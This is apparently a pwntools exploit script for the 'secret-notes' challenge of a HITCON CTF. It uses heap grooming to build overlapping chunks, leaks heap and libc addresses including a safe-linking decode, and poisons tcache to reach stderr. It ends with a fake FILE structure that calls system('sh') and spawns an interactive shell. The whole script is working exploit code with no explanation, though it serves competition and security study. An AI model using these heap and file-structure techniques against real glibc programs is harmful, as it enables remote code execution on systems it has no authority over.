from pwn import *
import builtins

file = ELF("./chal")
context.binary = file

def send(after: bytes, val, line=False):
    match type(val):
        case builtins.int | builtins.str:
            val = f"{val}".encode()
        case builtins.bytes:
            pass
    if line: val += b"\n"
    p.sendafter(after, val)

def sendline(after: bytes, val):
    send(after, val, line=True)

def login(username: bytes, password: bytes):
    sendline(b": ", 1)
    sendline(b": ", username)
    sendline(b": ", password)

def new_note(header: bytes, key: bytes, val: bytes, extra: bytes = None):
    note = b":".join([header, key, val])
    if extra:
        note += extra
    note += b"\n"
    return note

def add_note(note: bytes):
    sendline(b": ", 1)
    sendline(b": ", len(note))
    send(b": ", note)
    p.recvuntil(b" id ")
    return int(p.recvuntil(b".\n", drop=True))

def del_note(id: int):
    sendline(b": ", 3)
    sendline(b": ", id)

def get_note(id: int):
    sendline(b": ", 2)
    sendline(b": ", id)
    p.recvuntil(b": ")
    content = p.recvuntil(b"  1) add note\n", drop=True)
    return content

def xor(src: bytes, key: bytes):
    res = []
    for i in range(len(src)):
        res.append(src[i] ^ key[i % len(key)])
    return bytes(res)

context.terminal = ["kitty"]
script = """
libc
codebase
set $s = ((long *)($libc+0x2102b8))
set $notes = ((long [0x20] *)($codebase + 0x5080))
define save
    p (char *)$s[0]
end
define note
    p $notes[0]
end
handle SIGALRM nopass
c
"""
if args.LOCAL:
    p = remote("localhost", 12387)
    p.recv(1)
    gdb.attach("chal", gdbscript=script, exe="./chal")
elif args.REMOTE:
    p = remote("secret-notes.chal.hitconctf.com", "12387")
else:
    p = process("./run.sh")
    p.recv(1)
    gdb.attach("patch", gdbscript=script, exe="./chal")

key = b"B" * 8
password = b"BBBBBB" + p16(0x510)
login(b"A", password)

big = b"A:" + key + b":"
big = big.ljust(0x16fffff, b"C")
big += b"\n"
for i in range(2):
    add_note(big)


note = b"A:" + key + b":"
note = note.ljust(0x46, b"C") + b"\n"
stash = [add_note(note) for _ in range(4)]

note = b"A:" + key + b":CCCCC"
assert len(note) == 0x10
note += xor(b"X:Y:Z", key) + b"\n"
prep = add_note(note)
del_note(prep)

del_note(stash[0])
del_note(stash[1])
del_note(stash[2])
del_note(stash[3])

note = b"A:" + key + b":"
note = note.ljust(0x106, b"C") + b"\n"
overwrite = add_note(note)

note = b"A:" + key + b":"
note = note.ljust(0x106, b"C") + b"\n"
victim1 = add_note(note)

note = b"A:" + key + b":"
note = note.ljust(0x446, b"C") + b"\n"
victim2 = add_note(note)

note = b"A:" + key + b":"
note = note.ljust(0x106, b"C") + b"\n"
padding = add_note(note)

note = b"A:" + key + b":C"
note += b"\n"
move = add_note(note)
del_note(move)

add_note(big)

log.info(f"{overwrite = }")
del_note(overwrite)

wkey = b"C" * 8
note = b"Z:" + wkey + b":"
note = note.ljust(0x10, b"Z")
note = note.ljust(0x106, b"\x01")
note += p8(0x42) + p8(0x00)
note += p64(0x111)
note += p64(0x41)
note = note.ljust(0x216, b"\x01")
note += p8(0x42) + p8(0x00)
note += p64(0x451)
note += p64(0x41)
note = note.ljust(0x3f6, b"\x01")
note = note[:0x10] + xor(note[0x10:], wkey) + b"\n"
overlap = add_note(note)

log.info(f"{victim1 = }")
del_note(padding)
del_note(victim1)

log.info(f"{overlap = }")
leak = get_note(overlap)
leak = xor(leak, wkey)
leak = leak[0x105:]
heapleak = u64(leak[:8])

def decrypt(heapleak: int):
    nibbles = [int(n, 16) for n in f"{heapleak:x}"]
    for i in range(len(nibbles)-3):
        nibbles[i+3] = nibbles[i] ^ nibbles[i + 3]
    final = int("".join(f"{n:x}" for n in nibbles), 16)
    return final

heapleak = decrypt(heapleak)
heapbase = heapleak >> 12 << 12
log.info(f"{heapleak = :#x}")
log.info(f"{heapbase = :#x}")

log.info(f"{victim2 = }")
del_note(victim2)

leak = get_note(overlap)
leak = xor(leak , wkey)
leak = leak[0x215:]
libcleak = u64(leak[:8])
libcbase = libcleak - 0x209b20
log.info(f"{libcleak = :#x}")
log.info(f"{libcbase = :#x}")

del_note(overlap)

libc = ELF("./libc.so.6", checksec=False)
libc.address = libcbase
target = libc.sym._IO_2_1_stderr_ - 0x10
log.info(f"{target = :#x}")

wkey = b"C" * 8
note = b"Z:" + wkey + b":"
note = note.ljust(0x10, b"Z")
note = note.ljust(0x106, b"\x01")
note += p8(0x42) + p8(0x00)
note += p64(0x111)
note += p64(target ^ (heapbase >> 12))
note = note.ljust(0x216, b"\x01")
note += p8(0x42) + p8(0x00)
note += p64(0x451)
note += p64(0x41)
note = note.ljust(0x3f6, b"\x01")
note = note[:0x10] + xor(note[0x10:], wkey) + b"\n"
overlap = add_note(note)

win = b"X:YYYYYYYY:".ljust(0x106, b"Z") + b"\n"
add_note(win)

win = b"L:" + wkey + b":"
fake_file                = FileStructure(0)
fake_file.flags          = u64(b'  sh\x00\x00\x00\x00')
fake_file._IO_write_ptr  = 1
fake_file._wide_data     = libc.sym._IO_2_1_stderr_ - 0x10
fake_file._lock          = libc.sym._IO_2_1_stderr_ + 0x10
fake_file.chain          = libc.sym.system
fake_file.vtable         = libc.sym._IO_wfile_jumps
payload = bytes(fake_file)[:-0x10] + p64(libc.sym._IO_2_1_stderr_) + bytes(fake_file)[-0x8:]
log.info(f"{len(payload) = :#x}")

note = win + b"PPPPP" + payload
note = note.ljust(0x106, b"Z")
note = note[:0xb] + xor(note[0xb:], wkey) + b"\n"
print(note)
add_note(note)

sendline(b": ", 5)

p.interactive()

"""
IBUF
ENC_NOTE
NOTE
"""